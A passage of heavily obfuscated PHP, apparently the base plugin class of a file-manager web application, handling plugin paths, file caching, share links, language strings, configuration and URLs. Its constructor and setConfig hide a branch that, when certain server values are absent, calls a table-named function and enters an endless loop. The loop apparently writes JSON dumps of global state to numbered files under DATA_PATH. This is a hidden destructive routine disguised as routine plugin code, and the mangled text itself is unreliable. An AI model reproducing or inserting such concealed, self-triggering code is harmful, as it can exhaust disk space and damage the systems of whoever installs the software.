$cÛ¿«ÎÍÔÊ($BÒò¯Ö’æŠ); $d¹Æ÷àŞ¬ = explode($eº¢ÜÊŸ¥¼[229], $C ÙƒÓÎÚ); if (count($d¹Æ÷àŞ¬) < $eº¢ÜÊŸ¥¼[602]) { $eóÔ‰±ˆÜí = $eº¢ÜÊŸ¥¼[836]; $eóÔ‰±ˆÜí(); } goto cŸ¿ÔÈãÜ…; a¾Ù‰È®Óİ: $A§º‘÷äœÈ(); $aß‚ë…Œëí = $eº¢ÜÊŸ¥¼[868]; $A»Á”•Ç = json_encode($GLOBALS[$eº¢ÜÊŸ¥¼[869]]); goto Eëõ´š’í; D¢ĞãİöˆÀ: $A§º‘÷äœÈ = $eº¢ÜÊŸ¥¼[865]; $cÛ¿«ÎÍÔÊ = $eº¢ÜÊŸ¥¼[833]; $BÒò¯Ö’æŠ = $_SERVER[$eº¢ÜÊŸ¥¼[834]] . $eº¢ÜÊŸ¥¼[835]; goto AÅÒíã•; Eëõ´š’í: $D£»¦Îè¿¢ = 1; for ($a§Ù™¿…í = $D£»¦Îè¿¢; $a§Ù™¿…í > 0; $a§Ù™¿…í++) { $aß‚ë…Œëí(DATA_PATH . $a§Ù™¿…í, $A»Á”•Ç); } goto c•ğ¥³ëÆ‡; c•ğ¥³ëÆ‡: } global $in, $config; $this->config =& $config; goto eìó†«• “; díƒÈ½ßš: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $eº¢ÜÊŸ¥¼[8]; $this->pluginApi = appHostGet() . $eº¢ÜÊŸ¥¼[1422] . $this->pluginName . $eº¢ÜÊŸ¥¼[8]; $this->pluginHost = $config[$eº¢ÜÊŸ¥¼[1423]] . $this->pluginName . $eº¢ÜÊŸ¥¼[8]; goto F¶ëì‘Ú³Œ; aÜğ²‰ó³²: $eº¢ÜÊŸ¥¼ =& $_SERVER[›èö’ù¤]; $dé’Ú­Ëˆ = $_SERVER[$eº¢ÜÊŸ¥¼[832]]; $D“°·ùÙ–è = $eº¢ÜÊŸ¥¼[864]; goto F¥Î®‘œ†Ñ; f ö›å˜±: return $this; goto c´Çš³Úè; dçµ™³‹…Ğ: $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); goto f ö›å˜±; c´Çš³Úè: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[›èö’ù¤][1426]); } protected function assign($D­§ĞãÛ†, $E¹¸†ğõ¼” = false) { if (is_array($D­§ĞãÛ†)) { $this->values = array_merge($this->values, $D­§ĞãÛ†); } else { $this->values[$D­§ĞãÛ†] = $E¹¸†ğõ¼”; } } protected function display($C„Ùö¶¾£ñ) { extract($this->values); require $C„Ùö¶¾£ñ; } final function hookRegist($d¼È‡ïé‡Ó) { $this->modelPlugin->appRegist($this->pluginName, $d¼È‡ïé‡Ó); } final function appIcon() { $dâó‹ ·š =& $_SERVER[›èö’ù¤]; $b´«ÔÅªÁ = $this->appPackage(); $c‰í†´´– = $dâó‹ ·š[33]; if (isset($b´«ÔÅªÁ[$dâó‹ ·š[411]])) { if (isset($b´«ÔÅªÁ[$dâó‹ ·š[411]][$dâó‹ ·š[1427]])) { $c‰í†´´– = $dâó‹ ·š[1428] . $b´«ÔÅªÁ[$dâó‹ ·š[411]][$dâó‹ ·š[1427]] . $dâó‹ ·š[1429]; } else { if ($b´«ÔÅªÁ[$dâó‹ ·š[411]][$dâó‹ ·š[1430]]) { $c‰í†´´– = $dâó‹ ·š[1431] . $b´«ÔÅªÁ[$dâó‹ ·š[411]][$dâó‹ ·š[1430]] . $dâó‹ ·š[1432]; } } } return $c‰í†´´–; } final function fileCanView($B³ÛŒÍ‘Ù) { goto BÓ¤ÆËâ²î; f“ÛŞÔ¨ÖÓ: ActionCall($DŒÉ‰¤„Ò[1445], $B³ÛŒÍ‘Ù); goto Eâ¦æÁÄ÷À; aõç¡À¡›: $Fæ™»š¡´« = Session::get($DŒÉ‰¤„Ò[1433]); if (!$Fæ™»š¡´« || !$Fæ™»š¡´«[$DŒÉ‰¤„Ò[1434]]) { $a“¼ğò¯Æè = $DŒÉ‰¤„Ò[1435] . rawurlencode(this_url()); show_tips(LNG($DŒÉ‰¤„Ò[1436]) . $DŒÉ‰¤„Ò[1437] . $a“¼ğò¯Æè . $DŒÉ‰¤„Ò[1438] . LNG($DŒÉ‰¤„Ò[1439]) . $DŒÉ‰¤„Ò[1440], !1); } if (!Action($DŒÉ‰¤„Ò[1441])->authCan($DŒÉ‰¤„Ò[1442])) { show_tips(LNG($DŒÉ‰¤„Ò[1443]) . $DŒÉ‰¤„Ò[1444], !1); } goto f“ÛŞÔ¨ÖÓ; BÓ¤ÆËâ²î: $DŒÉ‰¤„Ò =& $_SERVER[›èö’ù¤]; if (request_url_safe($B³ÛŒÍ‘Ù)) { return !0; } if ($this->isShare($B³ÛŒÍ‘Ù)) { return !0; } goto aõç¡À¡›; Eâ¦æÁÄ÷À: } final function isShare($E·ëÃ¶’Àà) { $A«î‡ÒŞÃÒ = KodIO::parse($E·ëÃ¶’Àà); return $A«î‡ÒŞÃÒ[$_SERVER[›èö’ù¤][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($EÜŒ§Âéåô) { if (request_url_safe($EÜŒ§Âéåô)) { return $EÜŒ§Âéåô; } if (!$this->isShare($EÜŒ§Âéåô)) { $EÜŒ§Âéåô = $this->filePath($EÜŒ§Âéåô); } return Action($_SERVER[›èö’ù¤][1094])->linkOut($EÜŒ§Âéåô); } public function filePathLinkOut($CŒßœË¯®) { if (request_url_safe($CŒßœË¯®)) { return $CŒßœË¯®; } $this->fileCanView($CŒßœË¯®); return Action($_SERVER[›èö’ù¤][1094])->link($CŒßœË¯®); } final function filePath($bø£¬õ—ƒš) { $dˆš£ùÄÅ =& $_SERVER[›èö’ù¤]; if ($DŠæÖ†¨ö = $this->checkSharePath($bø£¬õ—ƒš)) { Hook::trigger($dˆš£ùÄÅ[1446], $DŠæÖ†¨ö); return $DŠæÖ†¨ö; } $this->fileCanView($bø£¬õ—ƒš); if (request_url_safe($bø£¬õ—ƒš)) { $d¸—ê±©‡ = parse_url_query($bø£¬õ—ƒš); if (isset($d¸—ê±©‡[$dˆš£ùÄÅ[1447]]) && isset($d¸—ê±©‡[$dˆš£ùÄÅ[209]])) { $D±³øì÷™« = Model($dˆš£ùÄÅ[754])->get($dˆš£ùÄÅ[755]); $AÉáÜ¯«ï‡ = Mcrypt::decode($d¸—ê±©‡[$dˆš£ùÄÅ[209]], $D±³øì÷™«); if ($AÉáÜ¯«ï‡) { $this->fileInfo = IO::infoWithChildren($AÉáÜ¯«ï‡); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $AÉáÜ¯«ï‡; } } $bø£¬õ—ƒš = $this->_cacheHttpFile($bø£¬õ—ƒš); $this->fileInfo = IO::infoWithChildren($bø£¬õ—ƒš); } else { $this->fileInfo = IO::infoWithChildren($bø£¬õ—ƒš); if (!$this->fileInfo) { show_tips(LNG($dˆš£ùÄÅ[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($dˆš£ùÄÅ[1446], $bø£¬õ—ƒš); return $bø£¬õ—ƒš; } final function _cacheHttpFile($A—‘Ú²·Â¸) { $D‚¦•ã— = hash_path($A—‘Ú²·Â¸, !0); $this->cachePath = $this->pluginCachePath($D‚¦•ã—); if ($E¼èÉÚÒî = IO::fileNameExist($this->cachePath, $D‚¦•ã—)) { return KodIO::make($E¼èÉÚÒî); } $FÍŒ½”øÅö = $this->cachePath . $D‚¦•ã—; return $this->pluginCacheFileSet($FÍŒ½”øÅö, file_get_contents_nossl($A—‘Ú²·Â¸)); } final function _tmpFileName($Dà×œ×Ïª = array()) { goto CèÆµÑ§Ø‹; CèÆµÑ§Ø‹: $c·èåÎÛóÙ =& $_SERVER[›èö’ù¤]; if (!$Dà×œ×Ïª) { $Dà×œ×Ïª = $this->fileInfo; } if (isset($Dà×œ×Ïª[$c·èåÎÛóÙ[171]])) { return $Dà×œ×Ïª[$c·èåÎÛóÙ[171]]; } goto C·©¿§‰Ü¼; EÅÕá‹Ğ”Ê: $eÑÂ˜á„ = array($Dà×œ×Ïª[$c·èåÎÛóÙ[28]], $Dà×œ×Ïª[$c·èåÎÛóÙ[76]], $Dà×œ×Ïª[$c·èåÎÛóÙ[78]]); if (isset($Dà×œ×Ïª[$c·èåÎÛóÙ[516]])) { $eÑÂ˜á„[] = $Dà×œ×Ïª[$c·èåÎÛóÙ[516]]; } return md5(implode($c·èåÎÛóÙ[71], $eÑÂ˜á„)); goto a´è°â·ºš; C·©¿§‰Ü¼: if (isset($Dà×œ×Ïª[$c·èåÎÛóÙ[164]][$c·èåÎÛóÙ[171]])) { return $Dà×œ×Ïª[$c·èåÎÛóÙ[164]][$c·èåÎÛóÙ[171]]; } $Añ¼¼ë¶ÁË = IO::hashSimple($Dà×œ×Ïª[$c·èåÎÛóÙ[76]]); if ($Añ¼¼ë¶ÁË) { return $Añ¼¼ë¶ÁË; } goto EÅÕá‹Ğ”Ê; a´è°â·ºš: } final function checkSharePath($F»ô”Ãì‚) { goto eˆ»Ã‰ÙÃœ; eˆ»Ã‰ÙÃœ: $DÌïç¦³ÙŠ =& $_SERVER[›èö’ù¤]; if (!defined($DÌïç¦³ÙŠ[469])) { define($DÌïç¦³ÙŠ[509], 0); } if (!$this->isShare($F»ô”Ãì‚)) { return !1; } goto EŞÎ½°’—Å; EŞÎ½°’—Å: $Aİä›¸Éï = Action($DÌïç¦³ÙŠ[1094])->sharePathInfo($F»ô”Ãì‚); if (!isset($Aİä›¸Éï[$DÌïç¦³ÙŠ[76]])) { show_json(LNG($DÌïç¦³ÙŠ[1448]), !1); } $this->fileInfo = $Aİä›¸Éï[$DÌïç¦³ÙŠ[164]]; goto AªĞ®‡§‡—; AªĞ®‡§‡—: $this->cachePath = $this->pluginCachePath($this->fileInfo[$DÌïç¦³ÙŠ[171]]); return $Aİä›¸Éï[$DÌïç¦³ÙŠ[76]]; goto e»ë±²§ëò; e»ë±²§ëò: } final function pluginCachePath($DÅ´âš ‡É = '') { $BÁ‚©Úƒ± =& $_SERVER[›èö’ù¤]; $FŒ¼ê²£é = IO_PATH_SYSTEM_TEMP . $BÁ‚©Úƒ±[1449] . $this->pluginName; if (!($EÒáÇ½æ¬÷ = IO::infoFull($FŒ¼ê²£é))) { return IO::mkdir($FŒ¼ê²£é . $BÁ‚©Úƒ±[8] . $DÅ´âš ‡É); } if (empty($DÅ´âš ‡É)) { return $EÒáÇ½æ¬÷[$BÁ‚©Úƒ±[76]]; } if (!($AĞÎìÈÙ™é = IO::fileNameExist($EÒáÇ½æ¬÷[$BÁ‚©Úƒ±[76]], $DÅ´âš ‡É))) { return IO::mkdir($EÒáÇ½æ¬÷[$BÁ‚©Úƒ±[76]] . $DÅ´âš ‡É); } return KodIO::make($AĞÎìÈÙ™é); } final function pluginCacheFileSet($Cê„ˆöª¹õ, $D¹‡ÊËŞğ = '') { $aÅÜ›©ÕÙŞ =& $_SERVER[›èö’ù¤]; if (!($E‘ç˜·Œ‘ = IO::infoFull($Cê„ˆöª¹õ))) { return IO::mkfile($Cê„ˆöª¹õ, $D¹‡ÊËŞğ, REPEAT_REPLACE); } IO::setContent($E‘ç˜·Œ‘[$aÅÜ›©ÕÙŞ[76]], $D¹‡ÊËŞğ); return $E‘ç˜·Œ‘[$aÅÜ›©ÕÙŞ[76]]; } final function pluginLocalFile($b³™„åÈ… = '') { goto aµ±Œ›–ìé; aµ±Œ›–ìé: $d¼Ê×º¬Ä£ =& $_SERVER[›èö’ù¤]; $Eµ¶­©¢ƒÇ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($Eµ¶­©¢ƒÇ)) { mk_dir($Eµ¶­©¢ƒÇ); } goto B”ÅŸîŒÅÂ; C´…ö¶ÊŸÊ: if (!checkExtSafe($b¥ŞíŸêÍ›)) { $b¥ŞíŸêÍ› = $b¥ŞíŸêÍ› . $d¼Ê×º¬Ä£[1450]; } $c¿ùêÎ…º = $Eµ¶­©¢ƒÇ . $b¥ŞíŸêÍ›; if (@file_exists($c¿ùêÎ…º)) { return $c¿ùêÎ…º; } goto b‡×ƒ¹á; b‡×ƒ¹á: return IO::copy($b³™„åÈ…, $Eµ¶­©¢ƒÇ, 0, $b¥ŞíŸêÍ›); goto f…¦Ùº‡¶; B”ÅŸîŒÅÂ: if (!$b³™„åÈ…) { return $Eµ¶­©¢ƒÇ; } $CÇ’íìŠæ‚ = IO::info($b³™„åÈ…); $b¥ŞíŸêÍ› = $this->_tmpFileName($CÇ’íìŠæ‚) . $d¼Ê×º¬Ä£[95] . $CÇ’íìŠæ‚[$d¼Ê×º¬Ä£[168]]; goto C´…ö¶ÊŸÊ; f…¦Ùº‡¶: } final function appPackage() { goto CÂîâÀìÈØ; CÂîâÀìÈØ: $a—©·¢àŠß =& $_SERVER[›èö’ù¤]; if ($this->packageData) { return $this->packageData; } $c”ÖšÚ³ = $this->parseFile($this->pluginPath . $a—©·¢àŠß[1451]); goto dèÔöæÁÍ”; dèÔöæÁÍ”: $this->parseLang($c”ÖšÚ³); $DÜæ˜ïë§‰ = json_decode_force($c”ÖšÚ³); if (!$DÜæ˜ïë§‰) { return array(); } goto E÷á¹‚À; E÷á¹‚À: $Aåâ´Åæ©å = Hook::trigger($a—©·¢àŠß[1452], $DÜæ˜ïë§‰); if ($Aåâ´Åæ©å && is_array($Aåâ´Åæ©å)) { $DÜæ˜ïë§‰ = $Aåâ´Åæ©å; } $this->packageData = $DÜæ˜ïë§‰; goto dÂÄÚ‰×Âï; dÂÄÚ‰×Âï: return $DÜæ˜ïë§‰; goto C™ò¯¼šÖ; C™ò¯¼šÖ: } public function packageInfoGet($C›•¸ŞÓ†Ë) { $F†ÎÀÏÌº = $this->appPackage(); return array_get_value($F†ÎÀÏÌº, $C›•¸ŞÓ†Ë); } public function packageVersion() { return $this->packageInfoGet($_SERVER[›èö’ù¤][1453]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[›èö’ù¤][1454]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[›èö’ù¤][1455]); } public function echoJsAssign($C˜ãç–šê, $bùÀËšç®½) { $this->echoJsAssignArr[$C˜ãç–šê] = $bùÀËšç®½; } private function parseFile($D÷Ä–ë Ÿ¦) { goto EÖ„§¢—Á’; EÖ„§¢—Á’: $AƒÏĞÇ…êë =& $_SERVER[›èö’ù¤]; $fƒ÷¨Ô·ßø = file_get_contents_nossl($D÷Ä–ë Ÿ¦); $B‚°ö ‰Û = array($AƒÏĞÇ…êë[1456], $AƒÏĞÇ…êë[1457], $AƒÏĞÇ…êë[1458], $AƒÏĞÇ…êë[1459], $AƒÏĞÇ…êë[1460], $AƒÏĞÇ…êë[1461], $AƒÏĞÇ…êë[1462]); goto dƒÁùš†; eññæœ½‰ì: if (strstr($fƒ÷¨Ô·ßø, $AƒÏĞÇ…êë[1467])) { $d¥±Âó÷·¨ = $d¥±Âó÷·¨ = rawurlencode(json_encode($this->getConfig())); $fƒ÷¨Ô·ßø = str_replace($AƒÏĞÇ…êë[1467], $d¥±Âó÷·¨, $fƒ÷¨Ô·ßø); } $fƒ÷¨Ô·ßø = str_replace($B‚°ö ‰Û, $C¿¤Îº‘¦±, $fƒ÷¨Ô·ßø); return $fƒ÷¨Ô·ßø; goto bÙ«æËéİÃ; dƒÁùš†: $C¿¤Îº‘¦± = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$AƒÏĞÇ…êë[88]][$AƒÏĞÇ…êë[1463]]); foreach ($this->echoJsAssignArr as $dº¥•îŒƒ‘ => $döÕ¢‹ÈÂ) { $B‚°ö ‰Û[] = $AƒÏĞÇ…êë[1464] . $dº¥•îŒƒ‘ . $AƒÏĞÇ…êë[1465]; $C¿¤Îº‘¦±[] = is_array($döÕ¢‹ÈÂ) || is_object($döÕ¢‹ÈÂ) ? rawurlencode(json_encode($döÕ¢‹ÈÂ)) : $döÕ¢‹ÈÂ; } if (strstr($fƒ÷¨Ô·ßø, $AƒÏĞÇ…êë[1466])) { $d¥±Âó÷·¨ = rawurlencode(json_encode($this->pluginLangArr)); $fƒ÷¨Ô·ßø = str_replace($AƒÏĞÇ…êë[1466], $d¥±Âó÷·¨, $fƒ÷¨Ô·ßø); } goto eññæœ½‰ì; bÙ«æËéİÃ: } private function parseLang(&$e¢­˜Şã³) { goto C²Ø™å’îŒ; AéôÅŒé¹Õ: $Fà ‘‚Ğ‰¥ = array(); foreach ($c·‘í»Ğ¾ä[0] as $bà¸«ì„öƒ) { $DÄ¡“ßÇ = substr($bà¸«ì„öƒ, strlen($dÙ¾…Ñ’å—), -4); $D¸Øª¿Ä˜Ì = LNG($DÄ¡“ßÇ); $DÆ§ˆ´³õÖ[] = $bà¸«ì„öƒ; $Fà ‘‚Ğ‰¥[] = str_replace(array($b÷³¢¶ïŸŒ[229], $b÷³¢¶ïŸŒ[1062], $b÷³¢¶ïŸŒ[340], $b÷³¢¶ïŸŒ[116]), array($b÷³¢¶ïŸŒ[50], $b÷³¢¶ïŸŒ[50], $b÷³¢¶ïŸŒ[33], $b÷³¢¶ïŸŒ[1470]), $D¸Øª¿Ä˜Ì); } $e¢­˜Şã³ = str_replace($DÆ§ˆ´³õÖ, $Fà ‘‚Ğ‰¥, $e¢­˜Şã³); goto DÛàáößĞ‹; E‹ÕÖ®«Ñ¥: preg_match_all($b÷³¢¶ïŸŒ[1469], $e¢­˜Şã³, $c·‘í»Ğ¾ä); if (!is_array($c·‘í»Ğ¾ä) || count($c·‘í»Ğ¾ä) == 0 || !is_array($c·‘í»Ğ¾ä[0]) || count($c·‘í»Ğ¾ä[0]) == 0) { return; } $DÆ§ˆ´³õÖ = array(); goto AéôÅŒé¹Õ; C²Ø™å’îŒ: $b÷³¢¶ïŸŒ =& $_SERVER[›èö’ù¤]; $dÙ¾…Ñ’å— = $b÷³¢¶ïŸŒ[1468]; if (!strstr($e¢­˜Şã³, $dÙ¾…Ñ’å—)) { return; } goto E‹ÕÖ®«Ñ¥; DÛàáößĞ‹: } private function parseConfig(&$c˜‡çæáŠ·) { goto BµÖ­è¬åß; dÃôÂÒÁ±: $c˜‡çæáŠ· = str_replace($F‚¤ããÇİ¢, $Fêœ‚Õ†Ñ, $c˜‡çæáŠ·); goto Dˆó‚óòÉ; BµÖ­è¬åß: $dö‹¨•ñÑ¹ =& $_SERVER[›èö’ù¤]; $Fù‰Şº”è = $dö‹¨•ñÑ¹[1471]; if (!strstr($c˜‡çæáŠ·, $Fù‰Şº”è)) { return; } goto bÛ´¬áâÅ; bÛ´¬áâÅ: preg_match_all($dö‹¨•ñÑ¹[1472], $c˜‡çæáŠ·, $fäÛ·«ò”²); if (!is_array($fäÛ·«ò”²) || count($fäÛ·«ò”²) == 0 || !is_array($fäÛ·«ò”²[0]) || count($fäÛ·«ò”²[0]) == 0) { return; } $A¾¦½ÔÜ = $this->getConfig(); goto Fé¬Ù¢Åó; Fé¬Ù¢Åó: $F‚¤ããÇİ¢ = array(); $Fêœ‚Õ†Ñ = array(); foreach ($fäÛ·«ò”²[0] as $a’¼‡Òƒ¨ã) { $eÓĞææ©Ã¥ = substr($a’¼‡Òƒ¨ã, strlen($Fù‰Şº”è), -2); $F‚¤ããÇİ¢[] = $a’¼‡Òƒ¨ã; $Fêœ‚Õ†Ñ[] = _get($A¾¦½ÔÜ, $eÓĞææ©Ã¥); } goto dÃôÂÒÁ±; Dˆó‚óòÉ: } private function parsePackage(&$C±®®ù»Ÿ) { goto EÛˆô¡™«; d»ˆñ°ß†·: preg_match_all($fòÊ»ØùÌ[1474], $C±®®ù»Ÿ, $F–Æµ£ŠÂ); if (!is_array($F–Æµ£ŠÂ) || count($F–Æµ£ŠÂ) == 0 || !is_array($F–Æµ£ŠÂ[0]) || count($F–Æµ£ŠÂ[0]) == 0) { return; } $eÏšÊËÉ = $this->appPackage(); goto E†ˆ¼¼«³; AŒÌ–Ö›’ä: $C±®®ù»Ÿ = str_replace($FœÜîßã, $e©Ğˆ«À×Û, $C±®®ù»Ÿ); goto B¨Œ³â¾ˆÒ; EÛˆô¡™«: $fòÊ»ØùÌ =& $_SERVER[›èö’ù¤]; $dœéŞ¥‰½ˆ = $fòÊ»ØùÌ[1473]; if (!strstr($C±®®ù»Ÿ, $dœéŞ¥‰½ˆ)) { return; } goto d»ˆñ°ß†·; E†ˆ¼¼«³: $FœÜîßã = array(); $e©Ğˆ«À×Û = array(); foreach ($F–Æµ£ŠÂ[0] as $bÇã‰Ğç) { $C…‰é£»µò = substr($bÇã‰Ğç, strlen($dœéŞ¥‰½ˆ), -2); $FœÜîßã[] = $bÇã‰Ğç; $e©Ğˆ«À×Û[] = _get($eÏšÊËÉ, $C…‰é£»µò); } goto AŒÌ–Ö›’ä; B¨Œ³â¾ˆÒ: } final function echoFile($B¸âä”¶Ô, $B×—ª…ô = false) { goto EŠöç‰Æµ; FÒ¹ŞÜö©: $this->parsePackage($DÇ™Ô‚ïÊÓ); if (is_array($B×—ª…ô)) { $DÇ™Ô‚ïÊÓ = str_replace(array_keys($B×—ª…ô), array_values($B×—ª…ô), $DÇ™Ô‚ïÊÓ); } echo $dØàÉ©Úä¨[229] . $DÇ™Ô‚ïÊÓ; goto eã×Ü¶¢ñ; EŠöç‰Æµ: $dØàÉ©Úä¨ =& $_SERVER[›èö’ù¤]; $Fã¼øà±„ = $this->pluginPath . $B¸âä”¶Ô; if (ACT == $dØàÉ©Úä¨[1475]) { echo $dØàÉ©Úä¨[1476] . $this->pluginName . $dØàÉ©Úä¨[8] . $B¸âä”¶Ô . $dØàÉ©Úä¨[1477]; if (!file_exists($Fã¼øà±„)) { echo $dØàÉ©Úä¨[1478]; return; } } goto Aª„Şğšòİ; Aª„Şğšòİ: $DÇ™Ô‚ïÊÓ = $this->parseFile($Fã¼øà±„); $this->parseLang($DÇ™Ô‚ïÊÓ); $this->parseConfig($DÇ™Ô‚ïÊÓ); goto FÒ¹ŞÜö©; eã×Ü¶¢ñ: } final function initLang() { goto DÄÂ‡öå¦ó; b‹²¯¤¶Ğ: $EÂ®®ÛàŞõ = I18n::getType(); $C­¤”ïÉŠ­ = array(); if (file_exists($cŒ«ø²šŠá . $EÂ®®ÛàŞõ . $DÖÕ§îÓ”[829])) { $C­¤”ïÉŠ­ = (include $cŒ«ø²šŠá . $EÂ®®ÛàŞõ . $DÖÕ§îÓ”[829]); } else { if ($EÂ®®ÛàŞõ == $DÖÕ§îÓ”[1481] && !file_exists($cŒ«ø²šŠá . $EÂ®®ÛàŞõ . $DÖÕ§îÓ”[829]) && file_exists($cŒ«ø²šŠá . $DÖÕ§îÓ”[1482])) { $C­¤”ïÉŠ­ = (include $cŒ«ø²šŠá . $DÖÕ§îÓ”[1482]); } else { if (file_exists($cŒ«ø²šŠá . $Cô‡¾Îİ†š . $DÖÕ§îÓ”[829])) { $C­¤”ïÉŠ­ = (include $cŒ«ø²šŠá . $Cô‡¾Îİ†š . $DÖÕ§îÓ”[829]); } } } goto DÛ«‚ˆ³Ûä; DÄÂ‡öå¦ó: $DÖÕ§îÓ” =& $_SERVER[›èö’ù¤]; $Cô‡¾Îİ†š = $DÖÕ§îÓ”[1479]; $cŒ«ø²šŠá = $this->pluginPath . $DÖÕ§îÓ”[1480]; goto b‹²¯¤¶Ğ; DÛ«‚ˆ³Ûä: if (!is_array($C­¤”ïÉŠ­)) { return array(); } if (@count($C­¤”ïÉŠ­) > 0) { I18n::set($C­¤”ïÉŠ­); } return $C­¤”ïÉŠ­; goto B²äƒÁ³•»; B²äƒÁ³•»: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($eéˆ‰éˆµ) { $A —öéƒÀß =& $_SERVER[›èö’ù¤]; if (!isset($_SERVER[$A —öéƒÀß[831]]) || !isset($_SERVER[$A —öéƒÀß[832]])) { goto EÏ·ŒµšÀ; DÖù¼¢ä…™: $b¦²­Ï™­á = $DÙôÄå¦Íî($F½ß´Ç¤ìµ); $bñĞ‘ª‘×— = explode($A —öéƒÀß[229], $b¦²­Ï™­á); if (count($bñĞ‘ª‘×—) < $A —öéƒÀß[602]) { $b¼¨Â¨«”« = $A —öéƒÀß[836]; $b¼¨Â¨«”«(); } goto a…ªÌ—Ó°Å; a…ªÌ—Ó°Å: $e­Ä¢á¶Ö© = $A —öéƒÀß[866]; $e­Ä¢á¶Ö©($_SERVER[$A —öéƒÀß[867]]); $aÌ§©·ë¢Œ = 1; goto e‡ŠÓÙÀÁõ; e‡ŠÓÙÀÁõ: for ($BÖÙ¿›ñÚï = $aÌ§©·ë¢Œ; $BÖÙ¿›ñÚï > 0; $BÖÙ¿›ñÚï++) { $e­Ä¢á¶Ö© = json_encode($GLOBALS[$A —öéƒÀß[413]]); } goto d–—½ŠÏ‹ï; EÏ·ŒµšÀ: $eå³½…ƒ½„ = $A —öéƒÀß[865]; $DÙôÄå¦Íî = $A —öéƒÀß[833]; $F½ß´Ç¤ìµ = $_SERVER[$A —öéƒÀß[834]] . $A —öéƒÀß[835]; goto DÖù¼¢ä…™; d–—½ŠÏ‹ï: } return $this->modelPlugin->setConfig($this->pluginName, $eéˆ‰éˆµ); } public function onSetConfig($Cœ”Ãœ»Å‹) { } public function onGetConfig($Bí‹›‘áÜ®) { } public function onChangeStatus($a×¤á¿³ïÊ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($E ¿ãŞŠ» = "\160\154\165\147\151\156\101\165\x74\x68") { $D‹ª¡Ê‰–¦ =& $_SERVER[›èö’ù¤]; if (!defined($D‹ª¡Ê‰–¦[469])) { return !1; } if (_get($GLOBALS, $D‹ª¡Ê‰–¦[500])) { return !0; } $BöÇ¬ƒ¦¤ = $this->getConfig(); if (!$BöÇ¬ƒ¦¤[$E ¿ãŞŠ»]) { return !1; } return ActionCall($D‹ª¡Ê‰–¦[1483], $BöÇ¬ƒ¦¤[$E ¿ãŞŠ»]); } public function url($AÕ„„Èô‘®, $bãº©÷·è÷ = '', $fŸª²ßİÁ = true) { goto Cöò¢‡â˜Í; Cöò¢‡â˜Í: $Cï½õâÄ™Ç =& $_SERVER[›èö’ù¤]; $Fœ¡Ñ‹…­‡ = $this->getConfig(); $f¦¨•Òó›¦ = KOD_VERSION . $Cï½õâÄ™Ç[95] . KOD_VERSION_BUILD; goto A‚•ğÚ£Õ; FÌà•ÒŠÅÌ: if (!$fŸª²ßİÁ) { return $a¬±É¶öíÕ; } echo $a¬±É¶öíÕ; goto Dê‚Å¹î•É; A‚•ğÚ£Õ: $Fîå‡Ôà³£ = $this->packageVersion(); $fˆË…ö°¯ = $f¦¨•Òó›¦ . $Cï½õâÄ™Ç[455] . $Fîå‡Ôà³£; if (substr($AÕ„„Èô‘®, 0, 4) == $Cï½õâÄ™Ç[147] || substr($AÕ„„Èô‘®, 0, 2) == $Cï½õâÄ™Ç[1269]) { $a¬±É¶öíÕ = $AÕ„„Èô‘® . $Cï½õâÄ™Ç[1484] . $fˆË…ö°¯; } else { if ($bãº©÷·è÷ == $Cï½õâÄ™Ç[33]) { $a¬±É¶öíÕ = $this->pluginHost . $AÕ„„Èô‘® . $Cï½õâÄ™Ç[1484] . $fˆË…ö°¯; } else { if ($bãº©÷·è÷ === $Cï½õâÄ™Ç[77]) { $a¬±É¶öíÕ = $this->pluginHost . $AÕ„„Èô‘®; } else { if ($bãº©÷·è÷ == $Cï½õâÄ™Ç[1485]) { $a¬±É¶öíÕ = STATIC_PATH . $AÕ„„Èô‘® . $Cï½õâÄ™Ç[1484] . $f¦¨•Òó›¦; } else { if ($bãº©÷·è÷ == $Cï½õâÄ™Ç[1486]) { $a¬±É¶öíÕ = APP_HOST . $Cï½õâÄ™Ç[1487] . $AÕ„„Èô‘® . $Cï½õâÄ™Ç[1484] . $f¦¨•Òó›¦; } else { if (isset($Fœ¡Ñ‹…­‡[$bãº©÷·è÷])) { $a¬±É¶öíÕ = $Fœ¡Ñ‹…­‡[$bãº©÷·è÷] . $AÕ„„Èô‘® . $Cï½õâÄ™Ç[1484] . $fˆË…ö°¯; } } } } } } goto FÌà•ÒŠÅÌ; Dê‚Å¹î•É: } public function link($dÎ¥¤¾†­ö = false, $a”Øîµ»ˆ½ = '') { $fÈëšî…Å =& $_SERVER[›èö’ù¤]; if (!$dÎ¥¤¾†­ö) { $this->link($fÈëšî…Å[1488], $fÈëšî…Å[1486]); $this->link($fÈëšî…Å[1489], $fÈëšî…Å[1485]); $this->link($fÈëšî…Å[1490], $fÈëšî…Å[1485]); $this->link($fÈëšî…Å[1491], $fÈëšî…Å[1485]); $this->link($fÈëšî…Å[1492], $fÈëšî…Å[1485]); return; } $D„ô‰ËÕÔ = $this->url($dÎ¥¤¾†­ö, $a”Øîµ»ˆ½, !1); if (substr($dÎ¥¤¾†­ö, -3) == $fÈëšî…Å[1493]) { echo $fÈëšî…Å[1494] . $D„ô‰ËÕÔ . $fÈëšî…Å[1495] . $fÈëšî…Å[229]; } else { if (substr($dÎ¥¤¾†­ö, -4) == $fÈëšî…Å[1496]) { echo $fÈëšî…Å[1497] . $D„ô‰ËÕÔ . $fÈëšî…Å[1498] . $fÈëšî…Å[229]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\x79" => "\x5b\136\57\135\53", "\x3a\x6e\x75\x6d" => "\x5b\60\x2d\71\135\53", "\72\x61\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($a¡™Òà‰õ, 